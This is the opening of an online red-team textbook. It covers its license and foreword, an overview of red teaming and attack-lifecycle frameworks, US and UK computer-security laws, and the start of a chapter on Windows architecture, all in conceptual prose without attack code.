<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Windows Offensive Techniques for Authorized Red Teams</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="src/mdbook-admonish.css">
        <link rel="stylesheet" href="src/custom.css">
        <link rel="stylesheet" href="./mdbook-admonish.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Windows Offensive Techniques for Authorized Red Teams</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mit-license"><a class="header" href="#mit-license">MIT License</a></h1>
<p><img src="img/RedTeamingBible.png" alt="img" /></p>
<p>Copyright (c) 2026</p>
<p>The Red Teamers Bible © 2026 by Jaden Andrews is licensed under Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International.</p>
<p>You are free to:</p>
<ul>
<li>Share — copy and redistribute the material in any medium or format</li>
<li>Adapt — remix, transform, and build upon the material</li>
</ul>
<p>Under the following terms:</p>
<ul>
<li>Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made.</li>
<li>NonCommercial — You may not use the material for commercial purposes.</li>
<li>ShareAlike — If you remix, transform, or build upon the material, you must distribute your contributions under the same license.</li>
</ul>
<p>No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits.</p>
<p>No warranties are given. The work is provided “as is,” without any express or implied warranty. The licensor shall not be liable for any damages arising from the use of this work.</p>
<p>To view a copy of this license, visit:
https://creativecommons.org/licenses/by-nc-sa/4.0/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="foreword"><a class="header" href="#foreword">Foreword</a></h1>
<p>History has proven that computer vulnerabilities persist, in spite of the intentions of the engineers and developers who create the products where these vulnerabilities are identified. It is my intention, in creating this book, that people become familiar with the methods and techniques used by malicious actors in order to exploit these vulnerabilities for malicious purposes.</p>
<p>Despite my intentions, I am aware that the knowledge contained within this body of work can be used by anyone to serve their individual interests, whether they seek to positively or negatively impact society at large. But in the wise words of Jon Erickson, the hacker ethic is <strong>"the appreciation of logic as an art form and the promotion of the free flow of information, surmounting conventional boundaries and restrictions for the simple goal of better understanding the world"</strong>. As I understand it, the methods and techniques used by malicious hackers to exploit computer vulnerabilities are principles of the natural world's function and it is in the interest of any ethical hacker to find ways to defend against any malicious actor who may seek to take advantage of these functions.</p>
<p>My ultimate goal in writing this book is to arm anyone who seeks to understand how computer systems work with the fundamental knowledge they need to understand the perspective of those who seek to do harm using those very systems. Computers are complex machines, barely distinguishable to most from magic. But unlike magic, computer systems are rooted in technologies that were created by human beings. It is our responsibility to maintain the knowledge required to understand how these systems work, if it is in our interest to continue promoting their use in the various industries where their functions are relied on. As of now, it is no longer a question of whether computer systems have any worth, rather it is our responsibility to delegate the places where computers are valuable resources and how we can protect them from those who seek to do harm.</p>
<p>While it is my intention to provide a comprehensive breakdown of Red Team Operations and their many faucets, I have to start somewhere. Please refer to the Appendices that I have made available if you are missing any information and use any additional resources to fill in other gaps. Hacking is just as much about one's ability to learn and adapt as it is about implementing technical skills. Use whatever is available to you to achieve your desired outcome.</p>
<p>To those who may seek to use the information contained here for malicious purposes, just know that everything written here is known, and those you seek to take advantage of are aware of your methods. There is always a bigger fish in this sea. Until you discover something that is new, you will be subject to the will of those who are more familiar with this space than you are.</p>
<p>For everyone else, recognize that I begin this work by covering the laws that govern this line of work. Use your time to study and understand them. These laws provide the framework from which you should develop your own principles and values. It is important that you understand that the power you seek to hold is sacred, and wielding it irresponsibly makes you no different from those who seek to do harm. Do your own research, and learn to use the knowledge you hold for the benefit of others. It is only by understanding the context from which these techniques can be used that you can use them responsibly.</p>
<p>Most importantly, I encourage readers to continue to learn whatever it is that they desire. As previously stated, hackers have an interest in discovering how the world works. Computers are but a single facet of general function. Go out and discover what else there is to learn. Even if you have a singular interest in learning to hack, a general knowledge of the world will be of great benefit in the long run. Hacking in general is a great understanding of how things work, such that the hacker is able to take advantage of the principles of universal function. Use your knowledge with caution, and remember that with great power comes great responsibility.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-to-red-teaming"><a class="header" href="#introduction-to-red-teaming">Introduction to Red Teaming</a></h1>
<p>During the Cold War in the 1960s, the <strong>RAND Corporation</strong>, who was working with the U.S. military, simulated wargames between the U.S. and the Soviets. The Soviet units were the red team and the American units were blue. Out of this, sprang our modern practice of Red Team Operations. While modern cybersecurity red teams do not have a focus on war time activities, their practice of emulating the tactics, techniques, and procedures (<strong>TTP</strong>) of their cyber adversaries is rooted in the same principles.</p>
<p>There are two main types of red team operations:</p>
<ul>
<li><strong>Adversary Emulation</strong>: The goal of these operations is to emulate a specific threat by leveraging their known TTPs. It is narrow in scope and aims to enhance an organizations defences against a specific threat.</li>
<li><strong>Adversary Simulation</strong>: The goal of these operations is to simulate a hypothetical threat by leveraging unknown or unique TTPs. This is very broad in scope and enhances defences against a range of threats.</li>
</ul>
<p>Whether it is Adversary Emulation or Simulation, the goal of the Red Team is to test the abilities of a <strong>Blue Team</strong>, or the defensive team that protects an organization from malicious cyber activity. This can be measured in:</p>
<ul>
<li><strong>Time to Detect</strong>: The time between the inciting antagonistic event and the initial response from the blue team.</li>
<li><strong>Time to Mitigate</strong>: The time between the inciting antagonistic event and the restoration of the organization's systems/domain to ideal conditions.</li>
</ul>
<p><strong>Threat Intelligence</strong> (TI) describes evidence-based knowledge of the mechanisms, context, and implications of attacks from threat actors. Using TI helps an organization identify emerging threats and their mitigations, frame testing scenarios, and analyze their own environments to identify patterns of TTPs and <strong>Indicators of Compromise</strong>. TI-related data has been standardized in many common formats, including:</p>
<ul>
<li><code>CAPEC</code>: Common Attack Pattern Enumeration and Classification</li>
<li><code>CybOX</code>: Cyber Observables</li>
<li><code>Microsoft Interflow</code></li>
<li><code>STIX</code>: Structured Thread Information</li>
<li><code>TAXII</code>: Trusted Automated eXchange of Indicator Information</li>
</ul>
<p><strong>Red Team Operators</strong> can use TI to research the TTPs of known <strong>Advanced Persistent Threats</strong>, in order to understand how they work and to perform Adversarial Emulation under realistic conditions.</p>
<p>There are a number of frameworks that try to map out the steps taken by an adversary when attacking a domain:</p>
<ul>
<li>
<p><strong>Cyber Kill Chain</strong>: First published by <a href="https://www.lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf">Lockheed Martin</a> in 2011, the Cyber Kill Chain breaks the attack lifecycle down into 7 simple steps:</p>
<ul>
<li><code>Reconnaissance</code>: The adversary scouts their target to find potential attack vectors.</li>
<li><code>Weaponization</code>: The adversary develops a malicious payload</li>
<li><code>Delivery</code>: The adversary develops a means of delivering the payload to the identified target.</li>
<li><code>Exploitation</code>: The adversary initializes the attack by delivering the weaponized payload.</li>
<li><code>Installation</code>: The payload is persistently installed on target systems</li>
<li><code>Command &amp; Control</code>: The adversary establishes a means of controlling the compromised targets.</li>
<li><code>Actions on Objectives</code>: The adversary achieves their operational goals.</li>
</ul>
</li>
<li>
<p><strong>Targeted Attack Lifecycle</strong>: The Cyber Kill Chain lacked verbosity, so in 2013, <a href="https://cloud.google.com/security/resources/insights/targeted-attack-lifecycle">Mandiant</a> published the <strong>Targeted Attack Lifecycle</strong>.</p>
<ul>
<li><code>Initial Reconnaissance</code>: The adversary researches the target's systems and employees to develop a methodology for intrusion.</li>
<li><code>Initial Compromise</code>: The malicious code is executed on one or more targets via the attack vector planned in Phase 1.</li>
<li><code>Establish Foothold</code>: The adversary maintains continued control over a compromised system by installing persistent backdoors.</li>
<li><code>Escalate Privileges</code>: The adversary exploits system vulnerabilities or misconfigurations to obtain local admin access to compromised systems.</li>
<li><code>Internal Reconnaissance</code>: Adversaries explore the target's internal infrastructure and environment .</li>
<li><code>Move Laterally</code>: The adversary uses credentials obtained during phase 4 to compromise additional systems</li>
<li><code>Maintain Presence</code>: The adversary maintains highly privileged access to domains and systems</li>
<li><code>Complete Mission</code>: The adversary accomplishes their operational objective.</li>
</ul>
</li>
</ul>
<p>One additional fact about the Targeted Attack Lifecycle is that, unlike the Cyber Kill Chain, it is non-linear, and many phases are repeated throughout the engagement, like so:
<img src="https://hackmd.io/_uploads/HygtEKq0eg.png" alt="image" /></p>
<blockquote>
<p>Source: <a href="https://www.gstatic.com/bricks/image/eedab7cf-6618-4699-aa52-9c67e4428f8d.png">https://www.gstatic.com/bricks/image/eedab7cf-6618-4699-aa52-9c67e4428f8d.png</a></p>
</blockquote>
<ul>
<li>Other Attack Lifecycles include:
<ul>
<li><a href="https://attack.mitre.org">MITRE ATT&amp;CK</a></li>
<li><a href="https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf">TIBER‑EU (Threat Intelligence‑Based Ethical Red teaming)</a></li>
<li><a href="https://www.unifiedkillchain.com/assets/The-Unified-Kill-Chain.pdf">The Unified Killchain</a></li>
<li><a href="https://www.threatintel.academy/wp-content/uploads/2020/07/diamond_summary.pdf">The Diamond Model of Intrusion Analysis</a></li>
</ul>
</li>
</ul>
<p>Over the course of this book, we will focus on building a fundamental understanding of just how malicious actors walk through these steps and how OffSec professionals use this knowledge to test the defenses of potentially vulnerable organizations.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="laws-and-compliance"><a class="header" href="#laws-and-compliance">Laws and Compliance</a></h1>
<h2 id="introduction"><a class="header" href="#introduction">Introduction</a></h2>
<p>While there are many laws that regulate the use of computers internationally, this section focuses on laws within the United States and the United Kingdom, as they establish a general foundation for the laws which are enforced at an international level. If you have an interest in the laws of any particular region of the world, more information can be found online, including the <a href="https://database.cyberpolicyportal.org">United Nations Institute for Disarmament Research (UNIDIR) Cyber Policy Portal Database</a> and the <a href="https://unctad.org/topic/ecommerce-and-digital-economy/ecommerce-law-reform/summary-adoption-e-commerce-legislation-worldwide">United Nations Conference on Trade and Development (UNCTAD) Global Cyberlaw Tracker</a>.</p>
<h2 id="laws"><a class="header" href="#laws">Laws</a></h2>
<h3 id="computer-fraud-and-abuse-act-cfaa"><a class="header" href="#computer-fraud-and-abuse-act-cfaa">Computer Fraud and Abuse Act (CFAA)</a></h3>
<p>The <strong>Computer Fraud and Abuse Act</strong> (CFAA) was codified in 1986 as <a href="https://uscode.house.gov/view.xhtml?req=(title:18%20section:1030%20edition:prelim)">18 U.S.C. § 1030</a> (Title 18 of the United States Code, Section 1030). It prohibits intentionally accessing a computer without authorization or exceeding authorized access. <strong>CFAA</strong> generally covers activities, such as:</p>
<ul>
<li>
<p><code>Unauthorized Access</code>: Gaining access to a computer system or network without permission.</p>
</li>
<li>
<p><code>Execeding Authorized Access</code>: Accessing a part of a system you are authorized to use, but then using that access to obtain or alter information you are not entitled to.</p>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Laws.html#admonition-note"></a>
</div>
<div>
<p>This particular tenant of the law played an important role in the case <code>Van Buren v. United States</code>, where it was determined that an employee has not violated <strong>CFAA</strong> if they misuse info that they were authorized to access.</p>
</div>
</div>
</li>
<li>
<p><code>Computer Trespassing</code>: Accessing a government computer without authorization.</p>
</li>
<li>
<p><code>Computer Fraud</code>: Accessing a protected computer with the intent to defraud and obtain something of value.</p>
</li>
<li>
<p><code>Damaging a Protected Computer</code>: Knowingly transmitting a program or code that causes damage to a computer, such as a virus or worm.</p>
</li>
<li>
<p><code>Password Trafficking</code>: Knowingly and with intent to defraud, trafficking in passwords or other information that allows unauthorized access to a computer.</p>
</li>
<li>
<p><code>Extortion</code>: Using threats to damage a computer or obtain information from it to extort money or other things of value.</p>
</li>
</ul>
<p><strong>CFAA</strong> applies to both criminal penalties and civil causes of action, allowing individuals and organizations that have suffered damages to sue violators.</p>
<h3 id="health-insurance-portability-and-accountability-act-hipaa"><a class="header" href="#health-insurance-portability-and-accountability-act-hipaa">Health Insurance Portability and Accountability Act (HIPAA)</a></h3>
<p>The <strong>Health Insurance Portability and Accountability Act</strong> was passed in 1996 and codified in the Code of Federal Regulations, <a href="https://www.ecfr.gov/current/title-45/subtitle-A/subchapter-C">Title 45 (Public Welfare)</a>, under parts 160, 162, and 164. It is primarily meant to protect the privacy and security of individuals' health information. It can be broken into two distinct parts:</p>
<ul>
<li>
<p><code>The Privacy Rule</code>: Establishes national standards for the protection of a patients medical records and other individually identifiable health information (Protected Health Information <code>PHI</code>).</p>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Laws.html#admonition-note-1"></a>
</div>
<div>
<p>This gives patients rights, such as:</p>
<ul>
<li>The right to access and obtain a copy of their own health records</li>
<li>The right to request corrections if they believe information is inaccurate</li>
</ul>
</div>
</div>
</li>
<li>
<p><code>The Security Rule</code>: Addresses the protection of electronic Protected Health Information (<code>ePHI</code>). It requires that covered entities implement administrative, physical, and technical safeguards to ensure the confidentiality, integrity, and availability of ePHI.</p>
</li>
</ul>
<p><strong>HIPPA</strong> also includes a <code>Breach Notification Rule</code>, which requires covered entities and their business associates to notify affected individuals, and in some cases the government and media, of a breach of unsecured PHI.</p>
<h3 id="payment-card-industry-data-security-standard"><a class="header" href="#payment-card-industry-data-security-standard">Payment Card Industry Data Security Standard</a></h3>
<p>The <a href="">Payment Card Industry Data Security standard</a> (<code>PCI-DSS</code>) is a set of security standards designed to ensure that all companies that process, store, or transmit credit card information maintain a secure environment. It was created by the major payment card brands (Visa, Mastercard, American Express, Discover, and JCB) through the Payment Card Industry Security Standards Council (PCI-SSC).</p>
<p><code>PCI-DSS</code> is organized around 12 core requirements, that fall into 6 categories:</p>
<ol>
<li>
<p>Build and Maintain a Secure Network and Systems</p>
<ul>
<li>Install and Maintain Network Security Controls.</li>
<li>Apply Secure Configurations to All System Components.</li>
</ul>
</li>
<li>
<p>Protect Cardholder Data</p>
<ul>
<li>Protect Stored Account Data.</li>
<li>Protect Cardholder Data with Strong Cryptography During Transmission Over Open, Public Networks.</li>
</ul>
</li>
<li>
<p>Maintain a Vulnerability management Program</p>
<ul>
<li>Protect All Systems and Networks from Malicious Software.</li>
<li>Develop and Maintain Secure Systems and Software.</li>
</ul>
</li>
<li>
<p>Implement Strong Access Control Measures</p>
<ul>
<li>Restrict Access to System Components and Cardholder Data by Business Need to Know.</li>
<li>Identify Users and Authenticate Access to System Components.</li>
<li>Restrict Physical Access to Cardholder Data.</li>
</ul>
</li>
<li>
<p>Regularly Monitor and Test Networks</p>
<ul>
<li>Log and Monitor All Access to System Components and Cardholder Data.</li>
<li>Test Security of Systems and Networks Regularly.</li>
</ul>
</li>
<li>
<p>Maintain an Information Security Policy</p>
<ul>
<li>Support Information Security with Organizational Policies and Programs.</li>
</ul>
</li>
</ol>
<p>Any organization which fails to comply with these standards may face fines, a loss of ability to process card payments, and/or increased transaction fees. Compliance is validated annually based on a company's transaction volume. The latest version, <code>4.0</code> was released in March 2022, and became mandatory after March 31, 2025.</p>
<h3 id="federal-information-security-modernization-act-fisma"><a class="header" href="#federal-information-security-modernization-act-fisma">Federal Information Security Modernization Act (FISMA)</a></h3>
<p>The <strong>Federal Information Security Modernization Act</strong> (<code>FISMA</code>) is United States Federal law, which governs the information security of federal government systems. It requires that every federal agency develop, document, and implement an agency-wide information security program. It was originally passed in 2002 as the Federal Information Security Management Act, but was amended and updated in 2014. FISMA is now codified as <a href="https://uscode.house.gov/view.xhtml?path=/prelim@title44/chapter35&amp;edition=prelim">44 U.S.C., Chapter 35, Subchapter II (§§ 3551–3558)</a>.</p>
<p><strong>FISMA</strong> mandates a framework, which includes:</p>
<ul>
<li><code>A Risk-Based Approach</code>: Agencies must categorize information systems and data based on the potential impact of a breach (low, mid, high), then implement security controls that are appropriate for that risk level.</li>
<li><code>Continuous Monitoring</code>: Requires agencies to continuously monitor their IT systems for vulnerabilities and threats.</li>
<li><code>Required Security Controls</code>: Agencies must implement a set of security controls based on standards and guidelines developed by the National Institute of Standards and Technology (NIST).</li>
<li><code>Annual Reporting</code>: Agencies must conduct annual security reviews and report the results to the Office of Management and Budged (OMB) and Congress.</li>
<li><code>Department of Homeland Security (DHS) Authoriy</code>: Codifies DHS's authority to manage information security for federal civilian agencies, provide technical assistance, and issue binding operational directives in response to security threats.</li>
</ul>
<h3 id="computer-misuse-act"><a class="header" href="#computer-misuse-act">Computer Misuse Act</a></h3>
<p>The <a href="https://www.legislation.gov.uk/ukpga/1990/18/contents">Computer Misuse</a> act is the main piece of UK legislation that criminalizes unauthorized access to computer systems and data, as well as other acts that can impair, or risk, impairing computer operations. It was enacted in 1990. Initially, it had 3 sections:</p>
<ul>
<li><code>Section 1</code>: Makes it an offense to gain unauthorized access to computer material, meaning systems or data.</li>
<li><code>Section 2</code>: Makes it an offense to gain unauthorized access with intent to commit or facilitate further offenses.</li>
<li><code>Section 3</code>: Makes it an offense to perform unauthorized acts against computer systems, either with intent to impair, or that may cause impairment, even if accidental.</li>
</ul>
<p>In 2006, the <code>Police and Justice Act</code> provided some amendments to the <strong>CMA</strong> by updating the wording and emphasizing the need for clear proof of intent before someone can be found to have committed an offense. This also criminalized the making, supplying, or obtaining of materials that are used to commit an offense (such as worms, viruses, trojans, etc.).</p>
<p>In 2015, the <code>Serious Crime Act</code> provided further amendments, enforcing much harsher sentences for unauthorized acts that cause or risk causing serious damage, including:</p>
<ul>
<li>Illness or Death</li>
<li>Disruption to:
<ul>
<li>Food</li>
<li>Water</li>
<li>Energy</li>
<li>Fuel</li>
<li>Transportation</li>
<li>Communication</li>
<li>Health</li>
<li>Government</li>
</ul>
</li>
</ul>
<p>This act also updated the territorial scope of an offense to include acts against another country and acts by a UK citizen from another country.</p>
<h3 id="human-rights-act"><a class="header" href="#human-rights-act">Human Rights Act</a></h3>
<p>The Human Rights Act is a piece of UK legislation that was introduced in 1998. It defines the fundamental rights and freedoms that everyone is entitled to. Rights are presented as a series of "articles", incorporates from the European Convention on Human Rights.
The main articles are:</p>
<ul>
<li><code>Part I Article 6</code>: Right to a fair trial
<ul>
<li>Innocent until proven guilty</li>
<li>Evidence gathered through security testing or incident responses in particular must be handled in a manner that preserves integrity to ensure admissibility in court.</li>
</ul>
</li>
<li><code>Part I Article 8</code>: Right to respect for private and family life
<ul>
<li>Everyone has the right to respect for their private life, home, and correspondence</li>
</ul>
</li>
<li><code>Part II Article I</code>: Protection of property
<ul>
<li>Everyone is entitled to the peaceful enjoyment of their possessions and no one shall be deprived of this through security testing.</li>
</ul>
</li>
</ul>
<h3 id="the-uk-data-protection-framework"><a class="header" href="#the-uk-data-protection-framework">The UK Data Protection Framework</a></h3>
<p>The UK Data Protection Framework is the primary legal and regulatory framework used in the United Kingdom to govern how personal data is collected, used, stored, and protected. It is made up of two main pillars:</p>
<ul>
<li><a href="https://gdpr-info.eu">The United Kingdom General Data Protection Regulation</a>: A comprehensive framework, which defines what protections and rights must be enforced to protect the personal data of UK citizens. It can be broken into 7 key data protection principles:
<ul>
<li><code>Lawfulness, Fairness, and Transparency</code>:
<ul>
<li><code>Lawfulness</code>: The processing of personal data must have a valid legal basis</li>
<li><code>Fairness</code>: Any processing of data must be fair toward the individual and not misleading or deceptive.</li>
<li><code>Transparency</code>: controllers must provide individuals with information regarding the processing of their data in a format that is concise and easy to understand.</li>
</ul>
</li>
<li><code>Purpose Limitation</code>: Data must be collected for specific and legitimate purposes, which are described at the time of collection and must not be processed for any other reason.</li>
<li><code>Data Minimization</code>: Controllers should not collect unnecessary personal data.</li>
<li><code>Accuracy</code>: Controllers must take every reasonable step to ensure inaccurate personal data is deleted or rectified.</li>
<li><code>Storage Limitation</code>: Controllers must delete data as soon as it ceases to be necessary.</li>
<li><code>Integrity and Confidentiality</code>: Personal data must be processed in a manner that ensures the appropriate level of security, including protection against unauthorized processing, accidental loss, destruction, or damage.</li>
<li><code>Accountability</code>: Controllers and processors are responsible for, and must be able to demonstrate compliance with all aforementioned data protection principles.</li>
</ul>
</li>
</ul>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Laws.html#admonition-note-2"></a>
</div>
<div>
<p>The <strong>GDPR</strong> provides the following definitions:</p>
<ul>
<li><code>Controllers</code>: A natural or legal person, public authority, agency, or other body which determines the purposes and means of processing personal data.
<ul>
<li>The entity responsible for defining the purposes and means of processing personal data.</li>
</ul>
</li>
<li><code>Processors</code>: A natural or legal person, public authority, agency, or other body which processes personal data on behalf of the controller. * The entity responsible for handling data based on the documented instructions of a controller</li>
</ul>
</div>
</div>
<blockquote>
<p><strong>Take Notice!!!</strong>
Red team services may be employed in order to fulfill GDPR Article 32:
<code>The controller and processor shall implement appropriate technical and organizational measures to ensure a level of security appropriate to the risk</code></p>
</blockquote>
<ul>
<li><a href="https://www.legislation.gov.uk/ukpga/2018/12/contents">The Data Protection Act</a>: Specific UK law, which implements, supplements, and tailors the GDPR — providing exemptions, enforcement powers, and special cases.</li>
</ul>
<h2 id="conclusion"><a class="header" href="#conclusion">Conclusion</a></h2>
<p>Hackers use their technical knowledge of how computer systems work in order to identify and exploit vulnerabilities. Certain laws help to distinguish between the ethical and unethical behaviors that can be exercised by them. More than this, ethical hackers can use their skills to help businesses and organizations remain in compliance with the laws and standards relevant to their industries. It is the responsibility of any offensive security practitioner to familiarize themselves with the laws that govern what they can and cannot do. But more importantly, use good judgment. Do not cause harm where it is not otherwise necessary.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-fundamentals"><a class="header" href="#windows-fundamentals">Windows Fundamentals</a></h1>
<h2 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h2>
<p>Programs are tightly integrated with operating systems. Identifying and understanding the bridging points between application programs and the operating system is critical to identifying and exploiting vulnerabilities. Microsoft Windows is the largest desktop OS and is the largest target for malicious attacks. The goal of this chapter is to establish how Windows works in order to inform the more practical work that we will engage later on.</p>
<h2 id="components-and-basic-architecture"><a class="header" href="#components-and-basic-architecture">Components and Basic Architecture</a></h2>
<p><code>Microsoft Windows</code> is a family of proprietary Operating Systems developed and sold by Microsoft. It runs on many computing platforms, and is responsible for managing hardware and software resources, providing a graphical user interface, and supplying built-in apps and services for file management, computer networking, security, and running third-party apps. Windows is made up of a few, key features and components:</p>
<ul>
<li><code>64-bit Architecture</code>: Modern Windows operating systems, including Windows 10 and 11, are designed as pure 64-bit environments. This allows them to optimally use modern, 64-bit processors designed by companies such as Intel, AMD, and Qualcomm.</li>
<li><code>Supports Virtual Memory</code>: Virtual memory allows the system to use disk space as if it were additional RAM, managing memory efficiently and enabling the execution of multiple applications, even when physical memory is low.</li>
<li><code>Portable</code>: Modern Windows is a highly portable operating system, written primarily in C and C++. This allows it to run on a variety of processor architectures, including x86-64 and ARM. The systems <code>Hardware Abstraction Layer</code> (HAL) isolates the OS from the physical hardware, making it easier to adapt to new hardware platforms and drivers.</li>
<li><code>Multithreaded</code>: Windows is a fully preemptive, multi-threaded operating system. The kernel and its core components are designed to handle multiple tasks concurrently, providing a responsive and fluid user experience. This allows modern applications to run smoothly and simultaneously, without one task monopolizing system resources.</li>
<li><code>Multi-processor Capable</code>: The Windows kernel is highly multi-processor capable, designed to efficiently utilize multiple CPU cores. This makes the operating system well suited for high-performance computing tasks from data center servers to high-end gaming and content creation applications.</li>
<li><code>Secure</code>: Security is a core design principle of modern Windows. Every object has an <code>Access Control List</code> (ACL) that specifies user permissions, and the <code>NT File System</code> (NTFS) supports ACLs on individual files and folders. Modern versions also include built-in encryption features, such as <code>BitLocker</code>, and continuous support for security features and other upgrades to protect against modern threats.</li>
<li><code>Compatible</code>: Windows 10 and 11 offer excellent backward compatibility. They can run a wide range of older applications, including those from previous Windows versions. The OS uses special isolation techniques to run legacy applications safely, preventing them from destabilizing the rest of the system.</li>
</ul>
<p>As we can see, Windows provides a number of features to provide a secure, easy, and reliable system for users to conduct a number of computer based activities. The remainder of this chapter will explore the more explicit details of how Windows is implemented.</p>
<h2 id="the-windows-executive"><a class="header" href="#the-windows-executive">The Windows Executive</a></h2>
<p>The <strong>Windows Executive</strong> is the core, kernel-mode layer of Windows that provides the fundamental operating-system services used by all programs and subsystems. It sits above the hardware-specific kernel layer and below user-mode code, acting as the main "engine" of the OS.</p>
<p>The Window Executive implements high-level OS services such as:</p>
<ul>
<li>Process and Thread Management</li>
<li>Memory Management</li>
<li>I/O and Device Management</li>
<li>Security and Access Control</li>
<li>Inter-Process Communication</li>
</ul>
